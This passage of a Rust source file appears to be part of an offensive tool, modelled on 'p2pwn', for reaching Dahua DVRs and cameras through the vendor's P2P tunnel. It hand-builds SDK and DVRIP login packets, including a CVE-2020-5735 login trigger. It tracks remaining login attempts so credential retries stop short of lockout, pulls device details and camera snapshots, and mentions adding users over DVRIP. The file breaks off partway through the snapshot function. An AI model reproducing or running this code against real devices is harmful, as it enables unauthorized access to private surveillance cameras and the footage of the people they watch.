use std::time::Duration;

use tokio::net::UdpSocket;
use tokio::sync::Mutex;

use crate::p2p::{self, PTCPSession};

/// Native Dahua SDK (binary protocol) TCP port. Reachable through the PTCP
/// tunnel by binding a fresh realm to this remote port — never via the device
/// public IP (that stays behind NAT).
pub const SDK_PORT: u16 = 37777;

// ---- hash helpers (mirror core/p2p/auth.go from thebadinteger/p2pwn) ----

pub fn md5_hex_upper(s: &str) -> String {
    format!("{:X}", md5::compute(s.as_bytes()))
}

/// Gen1Hash: MD5(password) reduced to 8 alphanumeric chars.
fn gen1_hash(password: &str) -> String {
    let raw = md5::compute(password.as_bytes());
    let raw = raw.0;
    let mut out = [0u8; 8];
    for i in 0..8 {
        let val = (raw[i * 2] as u16 + raw[i * 2 + 1] as u16) % 62;
        out[i] = if val < 10 {
            val as u8 + 48
        } else if val < 36 {
            val as u8 + 55
        } else {
            val as u8 + 61
        };
    }
    String::from_utf8(out.to_vec()).unwrap_or_default()
}

fn standard_rpc_hash(user: &str, password: &str, realm: &str, random: &str) -> String {
    let step1 = md5_hex_upper(&format!("{}:{}:{}", user, realm, password));
    md5_hex_upper(&format!("{}:{}:{}", user, random, step1))
}

fn sdk_login_hash(user: &str, password: &str, realm: &str, random: &str) -> String {
    let first_half = standard_rpc_hash(user, password, realm, random);
    let gen1 = gen1_hash(password);
    let second_half = md5_hex_upper(&format!("{}:{}:{}", user, random, gen1));
    format!("{}{}", first_half, second_half)
}

// ---- binary packets (mirror core/p2p/sdkbin.go) ----

pub fn login_packet(user: &str, pass: &str) -> Vec<u8> {
    let ul = user.as_bytes();
    let pl = pass.as_bytes();

    let mut creds = [0u8; 16];
    let n = ul.len().min(8);
    creds[..n].copy_from_slice(&ul[..n]);
    let n = pl.len().min(8);
    creds[8..8 + n].copy_from_slice(&pl[..n]);

    let pkt_len = 24 + ul.len() + pl.len();
    let ts = chrono::Utc::now().timestamp();

    let mut cmd = Vec::with_capacity(32 + ul.len() + pl.len() + 32);
    cmd.extend_from_slice(&[0xa0, 0x00, 0x00, 0x60, pkt_len as u8, 0x00, 0x00, 0x00]);
    cmd.extend_from_slice(&creds);
    cmd.extend_from_slice(&[0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0xa1, 0xaa]);
    cmd.extend_from_slice(ul);
    cmd.extend_from_slice(b"&&");
    cmd.extend_from_slice(pl);
    cmd.extend_from_slice(format!("\x00Random:{}\r\n\r\n", ts).as_bytes());
    cmd
}

/// "Old style" login trigger with blank hashes (CVE-2020-5735). Newer
/// firmware only issues the Realm:/Random: challenge after receiving this
/// packet; a plaintext `04 01` login is answered with a header-only code-1.
pub fn old_style_login_trigger() -> Vec<u8> {
    let mut cmd = vec![0xa0, 0x05, 0x00, 0x60, 0x00, 0x00, 0x00, 0x00];
    cmd.extend_from_slice(&[0u8; 16]);
    cmd.extend_from_slice(&[0x05, 0x02, 0x00, 0x01, 0x00, 0x00, 0xa1, 0xaa]);
    cmd
}

/// Hash login response using the CVE-2020-5735 frame: 32-byte header with the
/// payload length at bytes 4..8 ("admin&&" + 64-char hash = 71 = 0x47), then
/// `05 02 00 08 00 00 a1 aa` and `user&&<random_hash><final_hash>`.
fn build_old_style_hash_login_packet(user: &str, hash: &str) -> Vec<u8> {
    let creds = format!("{}&&{}", user, hash);
    let creds_len = creds.len() as u32;

    let mut buf = vec![0xa0, 0x05, 0x00, 0x60];
    buf.extend_from_slice(&creds_len.to_le_bytes());
    buf.extend_from_slice(&[0u8; 16]);
    buf.extend_from_slice(&[0x05, 0x02, 0x00, 0x08, 0x00, 0x00, 0xa1, 0xaa]);
    buf.extend_from_slice(creds.as_bytes());
    buf
}

fn session_id_from_resp(resp: &[u8]) -> u32 {
    if resp.len() >= 20 {
        u32::from_le_bytes([resp[16], resp[17], resp[18], resp[19]])
    } else {
        0
    }
}

fn build_hash_login_packet(user: &str, hash: &str) -> Vec<u8> {
    let creds = format!("{}&&{}", user, hash);
    let creds = creds.as_bytes();

    let mut buf = vec![0x05, 0x02, 0x09, 0x08];
    buf.extend_from_slice(&(creds.len() as u16).to_le_bytes());
    buf.extend_from_slice(&[0x00, 0x00, 0xa1, 0xaa]);
    buf.extend_from_slice(creds);
    buf
}

/// Old-style DVRIP realm request (mcw0/DahuaConsole `dahua_dvrip_login`):
/// `a0 01 00 00` + 20 zero bytes + `05 02 01 01 00 00 a1 aa`. Sent on the raw
/// realm to force a `Realm:/Random:` challenge from firmware that speaks the
/// binary DVRIP dialect instead of DHIP JSON. The new-style `a0 00 00 60`
/// login packet gets no reply on such devices (e.g. 7J05198PAZ5E8B4).
pub fn dvrip_realm_request() -> Vec<u8> {
    let mut cmd = vec![0xa0, 0x01, 0x00, 0x00];
    cmd.extend_from_slice(&[0u8; 20]);
    cmd.extend_from_slice(&[0x05, 0x02, 0x01, 0x01, 0x00, 0x00, 0xa1, 0xaa]);
    cmd
}

/// Old-style DVRIP hash login frame (`a0 05 00 00` + len(creds) LE + 16 zeros
/// + `05 02 00 08 00 00 a1 aa` + `user&&hash`). Kept separate from
/// `build_old_style_hash_login_packet` (which uses the `a0 05 00 60` prefix the
/// CVE-2020-5735 trigger expects) so the two flows can be tuned independently.
pub fn dvrip_hash_login_packet(user: &str, hash: &str) -> Vec<u8> {
    let creds = format!("{}&&{}", user, hash);
    let mut buf = vec![0xa0, 0x05, 0x00, 0x00];
    buf.extend_from_slice(&(creds.len() as u32).to_le_bytes());
    buf.extend_from_slice(&[0u8; 16]);
    buf.extend_from_slice(&[0x05, 0x02, 0x00, 0x08, 0x00, 0x00, 0xa1, 0xaa]);
    buf.extend_from_slice(creds.as_bytes());
    buf
}

/// Old-style DVRIP JSON frame header (mcw0/DahuaConsole `proto_header` dvrip):
/// `f6 00 00 00` + len + id + 0 + len + 0 + session + 0, then the JSON body.
/// Distinct from the DHIP frame (`20 00 00 00 "DHIP"` + session + id + len +
/// 0 + len + 0) that our DHIP client builds; the field order and magic differ.
pub fn dvrip_json_packet(session_id: u32, id: u32, json_str: &str) -> Vec<u8> {
    let len = json_str.len() as u32;
    let mut buf = Vec::with_capacity(32 + json_str.len());
    buf.extend_from_slice(&0xf6000000u32.to_be_bytes());
    buf.extend_from_slice(&len.to_le_bytes());
    buf.extend_from_slice(&id.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.extend_from_slice(&len.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.extend_from_slice(&session_id.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.extend_from_slice(json_str.as_bytes());
    buf
}

fn parse_challenge_body(body: &[u8]) -> Option<(String, String)> {
    let text = String::from_utf8_lossy(body);
    // New-style/DHIP challenges use `Realm:<value>`; the old-style DVRIP
    // challenge (mcw0/DahuaConsole `dahua_dvrip_login`) instead carries a bare
    // `Login to <serial>` line with no `Realm:` prefix, so fall back to that.
    let realm = extract_token(&text, "Realm:").or_else(|| {
        let idx = text.find("Login to")?;
        let after = &text[idx..];
        let end = after.find("\r\n").unwrap_or(after.len());
        Some(after[..end].trim().to_string())
    });
    let random = extract_token(&text, "Random:").or_else(|| {
        // legacy realm line is followed by `Random:<hex>`; grab after last ':'
        let idx = text.rfind(':')?;
        let after = &text[idx + 1..];
        let end = after.find("\r\n").unwrap_or(after.len());
        let r = after[..end].trim().to_string();
        if r.is_empty() {
            None
        } else {
            Some(r)
        }
    });
    match (realm, random) {
        (Some(r), Some(rn)) if !r.is_empty() && !rn.is_empty() => Some((r, rn)),
        _ => None,
    }
}

fn extract_token<'a>(text: &'a str, token: &str) -> Option<String> {
    let idx = text.find(token)?;
    let after = &text[idx + token.len()..];
    let end = after.find("\r\n")?;
    Some(after[..end].trim().to_string())
}

pub fn sdk_cmd_get_serial() -> Vec<u8> {
    let mut cmd = vec![
        0xa4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    ];
    cmd.resize(32, 0);
    cmd
}

pub fn sdk_cmd_get_device_type() -> Vec<u8> {
    let mut cmd = vec![
        0xa4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00,
    ];
    cmd.resize(32, 0);
    cmd
}

pub fn sdk_cmd_get_channels() -> Vec<u8> {
    let mut cmd = vec![
        0xa8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    ];
    cmd.resize(32, 0);
    cmd
}

/// Binary snapshot command (72 bytes) for the requested channel (0-based).
pub fn snapshot_cmd(ch: u8) -> Vec<u8> {
    let mut cmd = Vec::with_capacity(72);
    cmd.extend_from_slice(&[0x11, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00]);
    cmd.extend_from_slice(&[0u8; 20]);
    cmd.extend_from_slice(&[0x0a, 0x00, 0x00, 0x00]);
    cmd.push(ch);
    cmd.extend_from_slice(&[0u8; 16]);
    cmd.extend_from_slice(&[0u8; 3]);
    cmd.push(ch);
    cmd.extend_from_slice(&[0x00, 0x00, 0x00, 0x01]);
    cmd.extend_from_slice(&[0u8; 8]);
    cmd.extend_from_slice(&[0u8; 7]);
    cmd
}

fn strip_snapshot_garbage(data: &mut Vec<u8>, ch: u8) {
    let garbage1 = [0x0a, ch, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00];
    loop {
        let idx = data.windows(8).position(|w| w == garbage1);
        let Some(idx) = idx else { break };
        let start = idx.saturating_sub(24);
        let end = idx + 8;
        data.drain(start..end);
    }

    let garbage2 = [0xbc, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, ch];
    loop {
        let idx = data.windows(9).position(|w| w == garbage2);
        let Some(idx) = idx else { break };
        let end = idx + 32;
        data.drain(idx..end);
    }
}

fn sdk_string(resp: &[u8]) -> String {
    if resp.len() <= 32 {
        return String::new();
    }
    resp[32..]
        .iter()
        .take_while(|&&b| b != 0)
        .map(|&b| b as char)
        .collect()
}

// ---- SDK client over the existing PTCP tunnel ----

pub struct SdkClient {
    pub user: String,
    pub pass: String,
    pub verbose: bool,
}

/// Why an SDK channel query ended, so the caller can tell "wrong password"
/// apart from "the device will not open another PTCP channel".
#[derive(Debug, PartialEq, Eq)]
pub enum SdkInfo {
    Channels {
        serial: String,
        model: String,
        channels: usize,
    },
    /// The PTCP bind on 37777 never established. No credential can fix
    /// that, so retrying with other logins only burns time.
    BindFailed,
    /// The device answered the bind but rejected the login with a classified
    /// error (wrong password, locked account, …). Carries the detail so the
    /// caller can stop retrying when retries would lock the account.
    AuthRejected(SdkLoginError),
}

/// Why an SDK/DVRIP login was rejected, so callers can tell a wrong password
/// from a locked account instead of blindly burning the device's remaining
/// login attempts (which locks it — e.g. 7C03FF7PAZ93E44 hit `01 04`).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SdkLoginError {
    /// The PTCP bind on 37777 never established.
    BindFailed,
    /// No reply / malformed reply to a login frame.
    NoReply,
    /// `01 00`: wrong password. `auth_code` is the device's AuthCode field
    /// (response bytes 28..32, big-endian) — the remaining-attempts counter on
    /// firmware that reports one.
    AuthFailed { auth_code: Option<u32> },
    /// `01 01`: the username is not valid on the device.
    UsernameInvalid,
    /// `01 04`: the account is locked after too many failed attempts.
    AccountLocked,
    /// `01 05` / `01 11` / `01 13`: device not initialised / not implemented.
    NotSupported,
    /// Any other error code (`ErrorCode[0..2]`).
    Other(u8, u8),
}

impl SdkLoginError {
    /// True when retrying with another credential is pointless and would only
    /// keep decrementing the device's login-attempt budget.
    pub fn should_abort(&self) -> bool {
        match self {
            SdkLoginError::AccountLocked | SdkLoginError::UsernameInvalid => true,
            SdkLoginError::AuthFailed { auth_code } => {
                matches!(auth_code, Some(c) if *c > 0 && *c <= 2)
            }
            _ => false,
        }
    }

    /// Short human-readable description for CLI/verbose output.
    pub fn describe(&self) -> String {
        match self {
            SdkLoginError::BindFailed => "PTCP bind on 37777 failed".to_string(),
            SdkLoginError::NoReply => "no reply to SDK login".to_string(),
            SdkLoginError::AuthFailed { auth_code } => match auth_code {
                Some(c) if *c > 0 => format!("wrong password ({} attempt(s) left)", c),
                _ => "wrong password".to_string(),
            },
            SdkLoginError::UsernameInvalid => "username invalid".to_string(),
            SdkLoginError::AccountLocked => "account locked".to_string(),
            SdkLoginError::NotSupported => "login not supported by device".to_string(),
            SdkLoginError::Other(a, b) => format!("login error 0x{:02X}{:02X}", a, b),
        }
    }
}

/// Classify an SDK/DVRIP login response. Success is `ErrorCode[0..2] == 00 08`
/// (mcw0/DahuaConsole). A valid error frame carries the ErrorCode at header
/// bytes 8..10 and, for auth failures, the AuthCode counter at bytes 28..32
/// (big-endian).
pub fn classify_login_response(resp: &[u8]) -> Result<(), SdkLoginError> {
    if resp.len() >= 10 && resp[8] == 0x00 && resp[9] == 0x08 {
        return Ok(());
    }
    if resp.len() < 10 {
        return Err(SdkLoginError::NoReply);
    }
    let auth_code = if resp.len() >= 32 {
        let c = u32::from_be_bytes([resp[28], resp[29], resp[30], resp[31]]);
        if c == 0 { None } else { Some(c) }
    } else {
        None
    };
    Err(match (resp[8], resp[9]) {
        (0x01, 0x00) => SdkLoginError::AuthFailed { auth_code },
        (0x01, 0x01) => SdkLoginError::UsernameInvalid,
        (0x01, 0x04) => SdkLoginError::AccountLocked,
        (0x01, 0x05) | (0x01, 0x11) | (0x01, 0x13) => SdkLoginError::NotSupported,
        (a, b) => SdkLoginError::Other(a, b),
    })
}

/// A logged-in SDK channel on the SDK port (37777). The device login is
/// per-device, not per-channel, so callers bind/login once via
/// [`SdkClient::open_session`] and reuse it for every channel snapshot.
/// `session_id`/`challenge_realm` are the DVRIP login material, kept for the
/// old-style JSON path.
#[allow(dead_code)]
pub struct SdkSession {
    pub realm: u32,
    pub session_id: u32,
    pub challenge_realm: String,
}

impl SdkClient {
    pub fn new(user: &str, pass: &str) -> Self {
        SdkClient {
            user: user.to_string(),
            pass: pass.to_string(),
            verbose: false,
        }
    }

    pub fn with_verbose(mut self, verbose: bool) -> Self {
        self.verbose = verbose;
        self
    }

    async fn debug(&self, msg: String) {
        if self.verbose {
            eprintln!("  [debug] sdk: {}", msg);
        }
    }

    /// Bind a realm on the SDK port and log in once, returning a reusable
    /// session. Prefers the new-style `loginPacket`; falls back to the
    /// old-style DVRIP dialect for firmware that ignores it. Unlike
    /// `get_snapshot`, the realm is **not** disconnected here — the caller owns
    /// it and must release it with [`SdkClient::close_session`].
    pub async fn open_session(
        &self,
        sock: &UdpSocket,
        session: &Mutex<PTCPSession>,
    ) -> Result<SdkSession, SdkLoginError> {
        let bound = p2p::ptcp_bind(sock, session, SDK_PORT, Duration::from_secs(5))
            .await
            .ok_or(SdkLoginError::BindFailed)?;
        self.debug(format!("open_session: bound realm={} on SDK_PORT", bound))
            .await;

        if let Some(realm) = self.login_on_bind(sock, session, bound).await {
            return Ok(SdkSession {
                realm,
                session_id: 0,
                challenge_realm: String::new(),
            });
        }
        // `login_on_bind` can return None with the first bind still open (a
        // rejection that is not a challenge). Release it before the DVRIP retry.
        p2p::ptcp_disconnect(sock, session, bound).await;

        self.debug("open_session: new-style login failed, retrying DVRIP old-style".into())
            .await;
        let realm2 = p2p::ptcp_bind(sock, session, SDK_PORT, Duration::from_secs(5))
            .await
            .ok_or(SdkLoginError::BindFailed)?;
        let (realm, session_id, challenge_realm) =
            self.dvrip_login_on_bind(sock, session, realm2).await?;
        Ok(SdkSession {
            realm,
            session_id,
            challenge_realm,
        })
    }

    /// Release a session opened by [`SdkClient::open_session`].
    pub async fn close_session(
        &self,
        sock: &UdpSocket,
        session: &Mutex<PTCPSession>,
        sdk: &SdkSession,
    ) {
        p2p::ptcp_disconnect(sock, session, sdk.realm).await;
    }

    async fn send_realm(sock: &UdpSocket, session: &Mutex<PTCPSession>, realm: u32, data: &[u8]) {
        let mut s = session.lock().await;
        p2p::udp_send(
            sock,
            &s.send(p2p::PTCPBody::Payload(p2p::PTCPPayload {
                realm,
                data: data.to_vec(),
            }))
            .serialize(),
        )
        .await;
    }

    /// Send loginPacket on an already-bound realm; on a code-1 challenge reply,
    /// complete login on a fresh realm using the SDK hash. Returns the realm to
    /// use for subsequent exchanges.
    pub async fn login_on_bind(
        &self,
        sock: &UdpSocket,
        session: &Mutex<PTCPSession>,
        realm: u32,
    ) -> Option<u32> {
        self.debug(format!(
            "login_on_bind realm={} user='{}'",
            realm, self.user
        ))
        .await;
        Self::send_realm(sock, session, realm, &login_packet(&self.user, &self.pass)).await;

        // No `?` here: it would return None with the realm still bound, leaking
        // a PTCP channel on every failed login. Firmware that accepts a single
        // channel then refuses the next bind, which surfaced as `BindFailed` on
        // port 80 right after the channel-discovery attempts.
        let Some(resp) = p2p::sdk_read_realm(
            sock,
            session,
            realm,
            Duration::from_millis(200),
            Duration::from_secs(10),
        )
        .await
        else {
            p2p::ptcp_disconnect(sock, session, realm).await;
            return None;
        };
        self.debug(format!(
            "login resp[8]={:?} len={} bytes0=0x{:02X}{:02X}{:02X}{:02X}..0x{:02X}{:02X}{:02X}{:02X}",
            resp.get(8),
            resp.len(),
            resp.first().copied().unwrap_or(0),
            resp.get(1).copied().unwrap_or(0),
            resp.get(2).copied().unwrap_or(0),
            resp.get(3).copied().unwrap_or(0),
            resp.get(28).copied().unwrap_or(0),
            resp.get(29).copied().unwrap_or(0),
            resp.get(30).copied().unwrap_or(0),
            resp.get(31).copied().unwrap_or(0),
        ))
        .await;
        if resp.get(8).copied() == Some(0) {
            return Some(realm);
        }
        if resp.get(8).copied() == Some(1) {
            // The device demands a hash login. Some firmware include
            // "Realm:/Random:" in this very reply; newer firmware (6.6.x) reply
            // header-only and expect a CVE-2020-5735 old-style login trigger to
            // deliver the challenge. Prefer the inline challenge when present.
            let inline = parse_challenge_body(&resp);
            if let Some((cr, crnd)) = inline {
                self.debug(format!(
                    "challenge requested (realm='{}' rnd='{}')",
                    cr, crnd,
                ))
                .await;
                // This path binds a *new* realm, so the one we already hold must
                // be released here or it stays bound for the rest of the run.
                let new_realm = self
                    .login_with_hash_new_realm(sock, session, &cr, &crnd)
                    .await;
                if new_realm.is_some() {
                    p2p::ptcp_disconnect(sock, session, realm).await;
                }
                return new_realm;
            }
            self.debug("challenge requested (header-only, no Realm/Random) — using CVE-2020-5735 old-style trigger".into())
                .await;
            return self.login_cve_trigger(sock, session, realm).await;
        }
        self.debug(format!("login rejected: code={:?}", resp.get(8)))
            .await;
        None
    }

    async fn login_with_hash_new_realm(
        &self,
        sock: &UdpSocket,
        session: &Mutex<PTCPSession>,
        challenge_realm: &str,
        challenge_random: &str,
    ) -> Option<u32> {
        let mut cr = challenge_realm.to_string();
        let mut crnd = challenge_random.to_string();

        let realm = p2p::ptcp_bind(sock, session, SDK_PORT, Duration::from_secs(10)).await?;
        self.debug(format!(
            "challenge accepted → new bind realm={} on SDK_PORT",
            realm
        ))
        .await;

        // the new bind may carry a fresh challenge
        if let Some(ch) = p2p::sdk_read_realm(
            sock,
            session,
            realm,
            Duration::from_millis(200),
            Duration::from_secs(1),
        )
        .await
        {
            self.debug(format!(
                "fresh bind first bytes: len={} 0x{:02X}{:02X}..0x{:02X}{:02X}{:02X}",
                ch.len(),
                ch.first().copied().unwrap_or(0),
                ch.get(1).copied().unwrap_or(0),
                ch.get(29).copied().unwrap_or(0),
                ch.get(30).copied().unwrap_or(0),
                ch.get(31).copied().unwrap_or(0),
            ))
            .await;
            if let Some((nr, nrand)) = parse_challenge_body(&ch) {
                self.debug(format!(
                    "fresh challenge on new realm: r='{}' rnd='{}' (was r='{}')",
                    nr, nrand, cr
                ))
                .await;
                cr = nr;
                crnd = nrand;
            }
        }

        let full_hash = sdk_login_hash(&self.user, &self.pass, &cr, &crnd);
        self.debug(format!(
            "sending hash login realm={} hash(len={})",
            realm,
            full_hash.len()
        ))
        .await;
        Self::send_realm(
            sock,
            session,
            realm,
            &build_hash_login_packet(&self.user, &full_hash),
        )
        .await;

        let Some(resp) = p2p::sdk_read_realm(
            sock,
            session,
            realm,
            Duration::from_millis(200),
            Duration::from_secs(10),
        )
        .await
        else {
            p2p::ptcp_disconnect(sock, session, realm).await;
            return None;
        };
        self.debug(format!(
            "hash login resp[8]={:?} len={}",
            resp.get(8),
            resp.len()
        ))
        .await;
        if resp.get(8).copied() == Some(0) {
            Some(realm)
        } else {
            None
        }
    }

    /// CVE-2020-5735 login flow for newer firmware: send the old-style login
    /// trigger (blank hashes) to force a Realm:/Random: challenge, then answer
    /// with the old-style hash login frame on the same realm. Success is a
    /// non-zero session id in header bytes 16..20 (or resp[8]==0).
    async fn login_cve_trigger(
        &self,
        sock: &UdpSocket,
        session: &Mutex<PTCPSession>,
        realm: u32,
    ) -> Option<u32> {
        self.debug(format!("cve trigger old-style login realm={}", realm))
            .await;
        Self::send_realm(sock, session, realm, &old_style_login_trigger()).await;

        let Some(resp) = p2p::sdk_read_realm(
            sock,
            session,
            realm,
            Duration::from_millis(200),
            Duration::from_secs(10),
        )
        .await
        else {
            p2p::ptcp_disconnect(sock, session, realm).await;
            return None;
        };
        self.debug(format!(
            "cve trigger resp len={} bytes0=0x{:02X}{:02X}{:02X}{:02X} sess={}",
            resp.len(),
            resp.first().copied().unwrap_or(0),
            resp.get(1).copied().unwrap_or(0),
            resp.get(2).copied().unwrap_or(0),
            resp.get(3).copied().unwrap_or(0),
            session_id_from_resp(&resp),
        ))
        .await;

        let (cr, crnd) = parse_challenge_body(&resp)?;
        self.debug(format!("cve challenge realm='{}' rnd='{}'", cr, crnd))
            .await;

        let full_hash = sdk_login_hash(&self.user, &self.pass, &cr, &crnd);
        self.debug(format!(
            "cve sending old-style hash login hash(len={})",
            full_hash.len()
        ))
        .await;
        Self::send_realm(
            sock,
            session,
            realm,
            &build_old_style_hash_login_packet(&self.user, &full_hash),
        )
        .await;

        let Some(resp) = p2p::sdk_read_realm(
            sock,
            session,
            realm,
            Duration::from_millis(200),
            Duration::from_secs(10),
        )
        .await
        else {
            p2p::ptcp_disconnect(sock, session, realm).await;
            return None;
        };
        self.debug(format!(
            "cve hash login resp[8]={:?} len={} sess={}",
            resp.get(8),
            resp.len(),
            session_id_from_resp(&resp),
        ))
        .await;
        if resp.get(8).copied() == Some(0) || session_id_from_resp(&resp) != 0 {
            Some(realm)
        } else {
            None
        }
    }

    /// Bind a fresh realm on the SDK port (37777) and complete an old-style
    /// DVRIP login, returning `(realm_id, session_id, challenge_realm)` to use
    /// for JSON calls. Used by the addUser-via-DVRIP path for firmware that
    /// never answers DHIP.
    pub async fn dvrip_open(
        &self,
        sock: &UdpSocket,
        session: &Mutex<PTCPSession>,
    ) -> Result<(u32, u32, String), SdkLoginError> {
        let realm = p2p::ptcp_bind(sock, session, SDK_PORT, Duration::from_secs(10))
            .await
            .ok_or(SdkLoginError::BindFailed)?;
        self.debug(format!("dvrip_open: bound realm={} on SDK_PORT", realm))
            .await;
        self.dvrip_login_on_bind(sock, session, realm).await
    }

    /// Old-style DVRIP binary login: request a `Realm:/Random:` challenge with
    /// the `a0 01` frame, answer with the `a0 05` hash frame. Returns the realm
    /// id, the session id from response header bytes 16..20 on success, and the
    /// challenge realm string (for the HA1 password hash).
    pub async fn dvrip_login_on_bind(
        &self,
        sock: &UdpSocket,
        session: &Mutex<PTCPSession>,
        realm: u32,
    ) -> Result<(u32, u32, String), SdkLoginError> {
        self.debug(format!(
            "dvrip_login_on_bind realm={} user='{}'",
            realm, self.user
        ))
        .await;
        Self::send_realm(sock, session, realm, &dvrip_realm_request()).await;

        let Some(resp) = p2p::sdk_read_realm(
            sock,
            session,
            realm,
            Duration::from_millis(200),
            Duration::from_secs(10),
        )
        .await
        else {
            self.debug("dvrip: no reply to realm request".into()).await;
            p2p::ptcp_disconnect(sock, session, realm).await;
            return Err(SdkLoginError::NoReply);
        };
        self.debug(format!(
            "dvrip realm resp len={} head=0x{:02X}{:02X} err=0x{:02X}{:02X}{:02X}{:02X}",
            resp.len(),
            resp.first().copied().unwrap_or(0),
            resp.get(1).copied().unwrap_or(0),
            resp.get(8).copied().unwrap_or(0),
            resp.get(9).copied().unwrap_or(0),
            resp.get(10).copied().unwrap_or(0),
            resp.get(11).copied().unwrap_or(0),
        ))
        .await;

        let Some((cr, crnd)) = parse_challenge_body(&resp) else {
            self.debug("dvrip: realm resp carried no Realm/Random challenge".into())
                .await;
            p2p::ptcp_disconnect(sock, session, realm).await;
            return Err(SdkLoginError::NoReply);
        };
        self.debug(format!("dvrip challenge realm='{}' rnd='{}'", cr, crnd))
            .await;

        let full_hash = sdk_login_hash(&self.user, &self.pass, &cr, &crnd);
        self.debug(format!("dvrip sending hash login hash(len={})", full_hash.len()))
            .await;
        Self::send_realm(
            sock,
            session,
            realm,
            &dvrip_hash_login_packet(&self.user, &full_hash),
        )
        .await;

        let Some(resp) = p2p::sdk_read_realm(
            sock,
            session,
            realm,
            Duration::from_millis(200),
            Duration::from_secs(10),
        )
        .await
        else {
            self.debug("dvrip: no reply to hash login".into()).await;
            p2p::ptcp_disconnect(sock, session, realm).await;
            return Err(SdkLoginError::NoReply);
        };
        let sess = session_id_from_resp(&resp);
        let classified = classify_login_response(&resp);
        self.debug(format!(
            "dvrip hash login resp len={} err=0x{:02X}{:02X} auth=0x{:02X}{:02X}{:02X}{:02X} sess={} → {:?}",
            resp.len(),
            resp.get(8).copied().unwrap_or(0),
            resp.get(9).copied().unwrap_or(0),
            resp.get(28).copied().unwrap_or(0),
            resp.get(29).copied().unwrap_or(0),
            resp.get(30).copied().unwrap_or(0),
            resp.get(31).copied().unwrap_or(0),
            sess,
            classified,
        ))
        .await;
        match classified {
            Ok(()) => Ok((realm, sess, cr)),
            Err(e) => {
                p2p::ptcp_disconnect(sock, session, realm).await;
                Err(e)
            }
        }
    }

    /// DVRIP JSON exchange on an authenticated old-style realm: send `json` in
    /// the `f6` frame and return the JSON body. DVRIP responses carry the body
    /// length (LE) at header bytes 16..20 (mcw0/DahuaConsole `_p2p_len`), so the
    /// JSON is `payload[32 .. 32 + len]`, not simply `payload[32..]`.
    pub async fn dvrip_call(
        &self,
        sock: &UdpSocket,
        session: &Mutex<PTCPSession>,
        realm: u32,
        session_id: u32,
        id: u32,
        json_str: &str,
    ) -> Option<String> {
        Self::send_realm(
            sock,
            session,
            realm,
            &dvrip_json_packet(session_id, id, json_str),
        )
        .await;
        let raw = p2p::sdk_read_realm(
            sock,
            session,
            realm,
            Duration::from_millis(200),
            Duration::from_secs(10),
        )
        .await?;
        self.debug(format!(
            "dvrip_call id={} resp len={} head=0x{:02X}{:02X}",
            id,
            raw.len(),
            raw.first().copied().unwrap_or(0),
            raw.get(1).copied().unwrap_or(0),
        ))
        .await;
        if raw.len() <= 32 {
            return None;
        }
        let body_len = u32::from_le_bytes([raw[16], raw[17], raw[18], raw[19]]) as usize;
        let end = if body_len > 0 {
            (32 + body_len).min(raw.len())
        } else {
            raw.len()
        };
        let json = std::str::from_utf8(&raw[32..end]).ok()?;
        Some(json.trim_end_matches('\0').to_string())
    }

    async fn sdk_exchange(
        &self,
        sock: &UdpSocket,
        session: &Mutex<PTCPSession>,
        realm: u32,
        cmd: &[u8],
    ) -> Option<Vec<u8>> {
        Self::send_realm(sock, session, realm, cmd).await;
        p2p::read_realm_single(sock, session, realm, Duration::from_secs(5)).await
    }

    /// Query serial, model and channel count via the SDK (37777) protocol.
    pub async fn get_device_info(&self, sock: &UdpSocket, session: &Mutex<PTCPSession>) -> SdkInfo {
        self.debug("get_device_info: binding SDK_PORT".into()).await;
        let Some(realm) = p2p::ptcp_bind(sock, session, SDK_PORT, Duration::from_secs(5)).await
        else {
            return SdkInfo::BindFailed;
        };
        self.debug(format!("get_device_info: bound realm={}", realm))
            .await;

        let realm = match self.login_on_bind(sock, session, realm).await {
            Some(r) => r,
            None => {
                p2p::ptcp_disconnect(sock, session, realm).await;
                // The new-style `a0 00 00 60` login got no answer / was rejected.
                // Some firmware (binary DVRIP dialect, e.g. 7J05198PAZ5E8B4)
                // only answers the old-style `a0 01` realm request, so retry the
                // DVRIP flow on a fresh bind before giving up.
                self.debug("new-style login failed, retrying with DVRIP old-style login".into())
                    .await;
                let Some(realm2) =
                    p2p::ptcp_bind(sock, session, SDK_PORT, Duration::from_secs(5)).await
                else {
                    return SdkInfo::BindFailed;
                };
                match self.dvrip_login_on_bind(sock, session, realm2).await {
                    Ok((r, _sess, _)) => r,
                    Err(e) => {
                        // dvrip_login_on_bind already released realm2 on error.
                        return SdkInfo::AuthRejected(e);
                    }
                }
            }
        };

        let serial = self
            .sdk_exchange(sock, session, realm, &sdk_cmd_get_serial())
            .await
            .map(|r| sdk_string(&r))
            .unwrap_or_default();
        let model = self
            .sdk_exchange(sock, session, realm, &sdk_cmd_get_device_type())
            .await
            .map(|r| sdk_string(&r))
            .unwrap_or_default();
        let channels = self
            .sdk_exchange(sock, session, realm, &sdk_cmd_get_channels())
            .await
            .map(|r| -> usize {
                let content = sdk_string(&r);
                if content.is_empty() {
                    0
                } else {
                    content.split("&&").count()
                }
            })
            .unwrap_or(0);

        p2p::ptcp_disconnect(sock, session, realm).await;
        SdkInfo::Channels {
            serial,
            model,
            channels,
        }
    }

    /// Capture a JPEG snapshot on an already-authenticated session (no
    /// re-login). The channel is 1-based (mirrors p2pwn GetSnapshot: channel 1
    /// -> byte 0). The realm stays bound; release it separately.
    pub async fn snapshot_on(
        &self,
        sock: &UdpSocket,
        session: &Mutex<PTCPSession>,
        sdk: &SdkSession,
        channel: usize,
    ) -> Option<Vec<u8>> {
        let ch = if channel > 0 {
            ((channel - 1) % 256) as u8
        } else {
            0
        };

        // drain any leftover frames before requesting the snapshot
        let _ = p2p::sdk_read_realm(
            sock,
            session,
            sdk.realm,
